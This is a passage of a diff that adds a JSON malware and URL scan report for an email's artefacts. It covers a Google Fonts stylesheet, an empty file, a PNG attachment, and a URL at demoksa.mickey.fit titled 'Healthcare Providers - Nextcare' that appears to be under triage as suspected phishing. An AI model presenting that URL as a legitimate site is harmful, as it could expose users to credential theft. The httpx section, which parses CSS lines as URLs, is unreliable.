+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error",
+                  "httpx_error"
+                ],
+                "errors": [
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133035_488333/httpx_output.jsonl",
+                    "url": "772"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133037_622985/httpx_output.jsonl",
+                    "url": "/* cyrillic-ext */"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133039_437701/httpx_output.jsonl",
+                    "url": "@font-face {"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133041_011138/httpx_output.jsonl",
+                    "url": "font-family: 'Ubuntu';"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133042_823078/httpx_output.jsonl",
+                    "url": "font-style: normal;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133044_460503/httpx_output.jsonl",
+                    "url": "font-weight: 300;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133046_047130/httpx_output.jsonl",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvWyNPYZvg7UI.woff2) format('woff2');"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133047_798130/httpx_output.jsonl",
+                    "url": "unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133049_390468/httpx_output.jsonl",
+                    "url": "}"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133050_987338/httpx_output.jsonl",
+                    "url": "/* cyrillic */"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133052_801561/httpx_output.jsonl",
+                    "url": "@font-face {"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133054_660658/httpx_output.jsonl",
+                    "url": "font-family: 'Ubuntu';"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133056_306257/httpx_output.jsonl",
+                    "url": "font-style: normal;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133057_918246/httpx_output.jsonl",
+                    "url": "font-weight: 300;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133059_546419/httpx_output.jsonl",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjtGyNPYZvg7UI.woff2) format('woff2');"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133101_193348/httpx_output.jsonl",
+                    "url": "unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133102_856025/httpx_output.jsonl",
+                    "url": "}"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133104_474995/httpx_output.jsonl",
+                    "url": "/* greek-ext */"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133106_150103/httpx_output.jsonl",
+                    "url": "@font-face {"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133107_641505/httpx_output.jsonl",
+                    "url": "font-family: 'Ubuntu';"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133109_050301/httpx_output.jsonl",
+                    "url": "font-style: normal;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133110_530964/httpx_output.jsonl",
+                    "url": "font-weight: 300;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133112_045923/httpx_output.jsonl",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvGyNPYZvg7UI.woff2) format('woff2');"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133113_749789/httpx_output.jsonl",
+                    "url": "unicode-range: U+1F00-1FFF;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133115_361313/httpx_output.jsonl",
+                    "url": "}"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133116_891287/httpx_output.jsonl",
+                    "url": "/* greek */"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133118_392246/httpx_output.jsonl",
+                    "url": "@font-face {"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133119_959062/httpx_output.jsonl",
+                    "url": "font-family: 'Ubuntu';"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133121_560074/httpx_output.jsonl",
+                    "url": "font-style: normal;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133123_043921/httpx_output.jsonl",
+                    "url": "font-weight: 300;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133124_596838/httpx_output.jsonl",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1Czjs2yNPYZvg7UI.woff2) format('woff2');"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133126_293234/httpx_output.jsonl",
+                    "url": "unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133127_732057/httpx_output.jsonl",
+                    "url": "}"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133129_503876/httpx_output.jsonl",
+                    "url": "/* latin-ext */"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133131_127926/httpx_output.jsonl",
+                    "url": "@font-face {"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133132_512047/httpx_output.jsonl",
+                    "url": "font-family: 'Ubuntu';"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133134_046884/httpx_output.jsonl",
+                    "url": "font-style: normal;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133135_464163/httpx_output.jsonl",
+                    "url": "font-weight: 300;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133136_895314/httpx_output.jsonl",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvmyNPYZvg7UI.woff2) format('woff2');"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133138_318153/httpx_output.jsonl",
+                    "url": "unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133139_743363/httpx_output.jsonl",
+                    "url": "}"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133141_048012/httpx_output.jsonl",
+                    "url": "/* latin */"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133142_459707/httpx_output.jsonl",
+                    "url": "@font-face {"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133143_831340/httpx_output.jsonl",
+                    "url": "font-family: 'Ubuntu';"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133145_196978/httpx_output.jsonl",
+                    "url": "font-style: normal;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133146_583957/httpx_output.jsonl",
+                    "url": "font-weight: 300;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133148_256773/httpx_output.jsonl",
+                    "url": "src: url(https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjsGyNPYZvgw.woff2) format('woff2');"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133149_736403/httpx_output.jsonl",
+                    "url": "unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133151_070803/httpx_output.jsonl",
+                    "url": "}"
+                  },
+                  {
+                    "scanner": "httpx",
+                    "mid": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+                    "error": "No JSON lines found in /tmp/httpx_tmp/run_20260411_133152_497727/httpx_output.jsonl",
+                    "url": "0"
+                  }
+                ]
+              },
+              "tlsh": {
+                "elapsed": 0.000173,
+                "flags": []
+              },
+              "hash": {
+                "elapsed": 0.000848,
+                "sha1": "1f571feb5131bb5f812fb32b58cb8771af12e97a",
+                "sha256": "fa9d903fa21ede93ae8de46c976fff38f0bfcb415b32ba3b300d34c653f2db13",
+                "flags": [],
+                "tlsh": "T156419EA3142E940467930CC223DBBE358E8F21896045C5AABFFD18D49CE2D3A137679E",
+                "ssdeep": "48:UOWxbOWbFZUOWbOW5VOWGJc+uoOW3kN0xEYm:UOWxbOWbFZUOWbOW5VOWGJc+uoOWUN9z",
+                "md5": "bf0e6be8c472a9a314e763ef877cf11a"
+              },
+              "url": {
+                "elapsed": 0.00108,
+                "urls": [
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvGyNPYZvg7UI.woff2",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjtGyNPYZvg7UI.woff2",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjsGyNPYZvgw.woff2",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvmyNPYZvg7UI.woff2",
+                  "https://fonts.googleapis.com/css?family=Ubuntu:300",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1Czjs2yNPYZvg7UI.woff2",
+                  "https://fonts.gstatic.com/s/ubuntu/v21/4iCv6KVjbNBYlgoC1CzjvWyNPYZvg7UI.woff2"
+                ],
+                "flags": []
+              },
+              "yara": {
+                "elapsed": 0.007991,
+                "detection": [],
+                "rules_loaded": 2681,
+                "meta": [],
+                "flags": [],
+                "hex": [],
+                "information": [],
+                "collection": [],
+                "matches": [
+                  "url",
+                  "domain"
+                ],
+                "tags": []
+              }
+            }
+          },
+          {
+            "file": {
+              "flavors": {
+                "mime": [
+                  "application/x-empty"
+                ],
+                "yara": []
+              },
+              "scanners": [
+                "ScanClamav",
+                "ScanEntropy",
+                "ScanFooter",
+                "ScanHash",
+                "ScanHeader",
+                "ScanTlsh",
+                "ScanYara"
+              ],
+              "depth": 2,
+              "size": 0,
+              "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files",
+              "tree": {
+                "node": "ee02461b-a616-49f1-be66-5a08c1613a02",
+                "parent": "175df85a-234d-4f1f-bffd-47c904ed31f2",
+                "root": "f554a2c0-52f6-4103-9e23-393d0bf625dc"
+              },
+              "source": "HttpxScanner"
+            },
+            "iocs": [],
+            "scan": {
+              "entropy": {
+                "elapsed": 0.000176,
+                "entropy": 0,
+                "flags": []
+              },
+              "clamav": {
+                "Data scanned": "0.00 MB",
+                "flags": [],
+                "Time": "20.555 sec (0 m 20 s)",
+                "Scanned directories": "0",
+                "Infected files": "0",
+                "elapsed": 20.591798,
+                "Start Date": "2026",
+                "Known viruses": "3627833",
+                "End Date": "2026",
+                "/tmp/tmpud93jn1d": "Empty file",
+                "Scanned files": "0",
+                "Data read": "0.00 MB (ratio 0.00",
+                "Engine version": "1.4.3"
+              },
+              "footer": {
+                "elapsed": 0.000102,
+                "footer": {
+                  "data": "",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                "flags": [],
+                "backslash": ""
+              },
+              "header": {
+                "elapsed": 0.000069,
+                "flags": [],
+                "header": {
+                  "data": "",
+                  "_type": "bytes",
+                  "encoding": "base64"
+                },
+                "backslash": ""
+              },
+              "tlsh": {
+                "elapsed": 0.000116,
+                "flags": []
+              },
+              "hash": {
+                "elapsed": 0.000568,
+                "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                "flags": [],
+                "tlsh": "TNULL",
+                "ssdeep": "3::",
+                "md5": "d41d8cd98f00b204e9800998ecf8427e"
+              },
+              "yara": {
+                "elapsed": 0.007496,
+                "rules_loaded": 2681,
+                "meta": [],
+                "flags": [],
+                "hex": [],
+                "matches": [],
+                "tags": []
+              }
+            }
+          }
+        ]
+      }
+    },
+    {
+      "type": "url",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "size": 51,
+      "sha256": "01c205e91723f08be180b2c8f94c2648436b57cdaffcb740d246642e5818805d",
+      "url": "https://demoksa.mickey.fit/api/page/237/5963230521/",
+      "analysis": {
+        "artifact_type": "urls",
+        "root_event": {
+          "file": {
+            "flavors": {
+              "mime": [
+                "text/plain"
+              ],
+              "yara": []
+            },
+            "scanners": [
+              "ScanClamav",
+              "ScanEntropy",
+              "ScanFooter",
+              "ScanHash",
+              "ScanHeader",
+              "ScanTlsh",
+              "ScanUrl",
+              "ScanYara",
+              "HttpxScanner"
+            ],
+            "depth": 0,
+            "size": 51,
+            "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___5",
+            "tree": {
+              "node": "b6b0531d-8b55-44d1-bd54-844312102f2a",
+              "parent": "",
+              "root": "b6b0531d-8b55-44d1-bd54-844312102f2a"
+            },
+            "source": ""
+          },
+          "iocs": [],
+          "scan": {
+            "entropy": {
+              "elapsed": 0.000173,
+              "entropy": 4.438392037756332,
+              "flags": []
+            },
+            "clamav": {
+              "elapsed": 25.268701,
+              "Data scanned": "0.00 MB",
+              "Start Date": "2026",
+              "Known viruses": "3627833",
+              "End Date": "2026",
+              "flags": [],
+              "Time": "25.227 sec (0 m 25 s)",
+              "Scanned directories": "0",
+              "Scanned files": "1",
+              "Data read": "0.00 MB (ratio 0.00",
+              "Infected files": "0",
+              "Engine version": "1.4.3"
+            },
+            "footer": {
+              "elapsed": 0.000054,
+              "footer": {
+                "data": "dHRwczovL2RlbW9rc2EubWlja2V5LmZpdC9hcGkvcGFnZS8yMzcvNTk2MzIzMDUyMS8=",
+                "_type": "bytes",
+                "encoding": "base64"
+              },
+              "flags": [],
+              "backslash": "ttps://demoksa.mickey.fit/api/page/237/5963230521/"
+            },
+            "header": {
+              "elapsed": 0.000048,
+              "flags": [],
+              "header": {
+                "data": "aHR0cHM6Ly9kZW1va3NhLm1pY2tleS5maXQvYXBpL3BhZ2UvMjM3LzU5NjMyMzA1MjE=",
+                "_type": "bytes",
+                "encoding": "base64"
+              },
+              "backslash": "https://demoksa.mickey.fit/api/page/237/5963230521"
+            },
+            "httpxner": {
+              "elapsed": 10.047728,
+              "httpx": [
+                {
+                  "status_code": 200,
+                  "raw_httpx_output": "/tmp/httpx_tmp/run_20260411_133024_828646/httpx_output.jsonl",
+                  "parent_file_id": "52c584b4-257d-49f4-a0be-0c82a34d59d3",
+                  "screenshot_emitted": true,
+                  "source_type": "external",
+                  "redirect_chain_details": [],
+                  "screenshot_sha256": "3c8149701707e0f06e4b9b1b269ea0cc25e5258de1150668c58d7a4db49c6f6f",
+                  "parent_file_name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___urls___5",
+                  "certificates": [
+                    {
+                      "serialNumber": "06:BF:50:3C:A1:52:6D:36:A6:4C:50:D1:22:92:AC:E6:93:20",
+                      "subject": "CN=demoksa.mickey.fit",
+                      "validFrom": "2026-03-07T10:26:47Z",
+                      "issuer": "CN=E8, O=Let's Encrypt, C=US",
+                      "validTo": "2026-06-05T10:26:46Z"
+                    }
+                  ],
+                  "final_url": null,
+                  "screenshot_filename": "185.217.127.159_screenshot.png",
+                  "redirects": [],
+                  "httpx_run_directory": "/tmp/httpx_tmp/run_20260411_133024_828646",
+                  "input_url": "https://demoksa.mickey.fit/api/page/237/5963230521/",
+                  "page": {
+                    "server": "nginx/1.18.0 (Ubuntu)",
+                    "tlsValidTo": "2026-06-05T10:26:46Z",
+                    "tlsValidFrom": "2026-03-07T10:26:47Z",
+                    "domain": "185.217.127.159",
+                    "ip": "185.217.127.159",
+                    "asnname": null,
+                    "title": "Healthcare Providers - Nextcare",
+                    "asn": null,
+                    "url": "https://demoksa.mickey.fit/api/page/237/5963230521/",
+                    "tlsIssuer": "E8",
+                    "ptr": null
+                  }
+                }
+              ],
+              "flags": []
+            },
+            "tlsh": {
+              "elapsed": 0.000091,
+              "flags": []
+            },
+            "hash": {
+              "elapsed": 0.000268,
+              "sha1": "94ccc6fa9df7d12206e594a990d2d4a74a3f4af6",
+              "sha256": "01c205e91723f08be180b2c8f94c2648436b57cdaffcb740d246642e5818805d",
+              "flags": [],
+              "tlsh": "T1FB90029301005DC1B950149E7D01242F2183B2947AB00C6A84942012249455951C1468",
+              "ssdeep": "3:N8Y3OWYZ+MrDKEJa:2Y35RMrDPJa",
+              "md5": "a9d1a95d284a99fec3e819bddc0839a6"
+            },
+            "url": {
+              "elapsed": 0.000302,
+              "urls": [
+                "https://demoksa.mickey.fit/api/page/237/5963230521"
+              ],
+              "flags": []
+            },
+            "yara": {
+              "elapsed": 0.005133,
+              "detection": [],
+              "rules_loaded": 2681,
+              "meta": [],
+              "flags": [],
+              "hex": [],
+              "information": [],
+              "collection": [],
+              "matches": [
+                "url",
+                "domain"
+              ],
+              "tags": []
+            }
+          }
+        },
+        "archive_children": [],
+        "counts": {
+          "total_events": 1,
+          "archive_children": 0
+        },
+        "artifact_name": "https://demoksa.mickey.fit/api/page/237/5963230521/",
+        "events": []
+      }
+    }
+  ],
+  "files": [
+    {
+      "filename": "<image_0>",
+      "type": "attachment",
+      "parent": "75203985-9c2a-4ce6-990b-bcd61d4a19b4",
+      "parent_type": "email",
+      "content_type": "image/png",
+      "size": 42463,
+      "sha256": "8768498e2dec4cc1fd459137993b9b2b2fa4b8b62d4b99fccd5c12c2ce35532b",
+      "analysis": {
+        "artifact_type": "files",
+        "root_event": {
+          "file": {
+            "flavors": {
+              "mime": [
+                "image/png"
+              ],
+              "yara": [
+                "png_file"
+              ]
+            },
+            "scanners": [
+              "ScanClamav",
+              "ScanEntropy",
+              "ScanExiftool",
+              "ScanFooter",
+              "ScanHash",
+              "ScanHeader",
+              "ScanLsb",
+              "ScanOcr",
+              "ScanPngEof",
+              "ScanQr",
+              "ScanTlsh",
+              "ScanYara"
+            ],
+            "depth": 0,
+            "size": 42463,
+            "name": "75203985-9c2a-4ce6-990b-bcd61d4a19b4___files___<image_0>",
+            "tree": {
+              "node": "1238519a-ed44-445e-89b1-0ebbe950480f",
+              "parent": "",
+              "root": "1238519a-ed44-445e-89b1-0ebbe950480f"
+            },
+            "source": ""
+          },
+          "iocs": [],
+          "scan": {
+            "png_eof": {
+              "elapsed": 0.000288,
+              "flags": [
+                "no_trailer"
+              ]
+            },
+            "qr": {
+              "elapsed": 0.022933,
+              "data": [],
+              "flags": [
+                "decode_error"
+              ]
+            },
+            "entropy": {
+              "elapsed": 0.000145,
+              "entropy": 7.980932324433711,
+              "flags": []
+            },
+            "clamav": {
+              "elapsed": 19.519164,
+              "Data scanned": "0.04 MB",
+              "Start Date": "2026",
+              "Known viruses": "3627833",
+              "End Date": "2026",
+              "flags": [],
+              "Time": "19.489 sec (0 m 19 s)",
+              "Scanned directories": "0",
+              "Scanned files": "1",
+              "Data read": "0.04 MB (ratio 1.00",
+              "Infected files": "0",
+              "Engine version": "1.4.3"
+            },
+            "footer": {
+              "elapsed": 0.000102,
+              "footer": {
+                "data": "QRAEQSWCI0EQBEEQBEEQBBEcCYIgCIIgCIIgqP4Pb/GaknSIufcAAAAASUVORK5CYII=",
+                "_type": "bytes",
+                "encoding": "base64"
+              },
+              "flags": [],
+              "backslash": "A\\x10\\x04A%\\x82#A\\x10\\x04A\\x10\\x04A\\x10\\x04\\x11\\x1c\\t\\x82 \\x08\\x82 \\x08\\x82 \\xa8\\xfe\\x0fo\\xf1\\x9a\\x92t\\x88\\xb9\\xf7\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82"
+            },
+            "header": {
+              "elapsed": 0.000041,
+              "flags": [],
+              "header": {
+                "data": "iVBORw0KGgoAAAANSUhEUgAAA0cAAABvCAYAAAAnrbtFAAAAAXNSR0IArs4c6QAAAAQ=",
+                "_type": "bytes",
+                "encoding": "base64"
+              },
+              "backslash": "\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x03G\\x00\\x00\\x00o\\x08\\x06\\x00\\x00\\x00'\\xad\\xbbE\\x00\\x00\\x00\\x01sRGB\\x00\\xae\\xce\\x1c\\xe9\\x00\\x00\\x00\\x04"
+            },
+            "lsb": {
+              "elapsed": 0.005543,
+              "flags": [],
+              "lsb": true
+            },
+            "exiftool": {
+              "filetype": "PNG",
+              "imagewidth": 839,
+              "flags": [],
+              "filesize": "42 kB",
+              "interlace": "Noninterlaced",
+              "directory": "/tmp",
+              "elapsed": 0.147577,
+              "fileinodechangedate": "2026:04:11 13:29:34+00:00",
+              "bitdepth": 8,
+              "exiftoolversion": 12.6,
+              "filepermissions": "-rw-------",
+              "sourcefile": "/tmp/tmpa_4vjb0g",
+              "pixelsperunity": 3779,
+              "pixelsperunitx": 3779,
+              "imageheight": 111,
+              "filemodifydate": "2026:04:11 13:29:34+00:00",
+              "filetypeextension": "png",
+              "megapixels": 0.093,
+              "imagesize": "839x111",
+              "pixelunits": "meters",
+              "srgbrendering": "Perceptual",
+              "filter": "Adaptive",
+              "filename": "tmpa_4vjb0g",
+              "fileaccessdate": "2026:04:11 13:29:34+00:00",
+              "mimetype": "image/png",
+              "colortype": "RGB with Alpha",
+              "compression": "Deflate/Inflate",
+              "gamma": 2.2
+            },
+            "tlsh": {
+              "elapsed": 0.00342,
+              "flags": []
+            },
+            "hash": {
+              "elapsed": 0.001011,
+              "sha1": "c9da9a8a63d9abeb8b2a42c3ae04c727ae240f62",
+              "sha256": "8768498e2dec4cc1fd459137993b9b2b2fa4b8b62d4b99fccd5c12c2ce35532b",
+              "flags": [],
+              "tlsh": "T12913E1CC91BF9E8BBAC92957BD4004C6A119972698F0218D0DD57B2AA0FF1FE47480CE",
+              "ssdeep": "768:/176y2Ypj504wbPqZXFgXbT10qEdk528fiVxTyWm7B6DonG9GEBALBr5d07X8ya2:/uej504pZGXbR0C528KVxTypF6DiEEBo",
+              "md5": "d38984d99ea9b1d3346f929a9c052fcc"
+            },
+            "ocr": {
+              "elapsed": 0.868216,
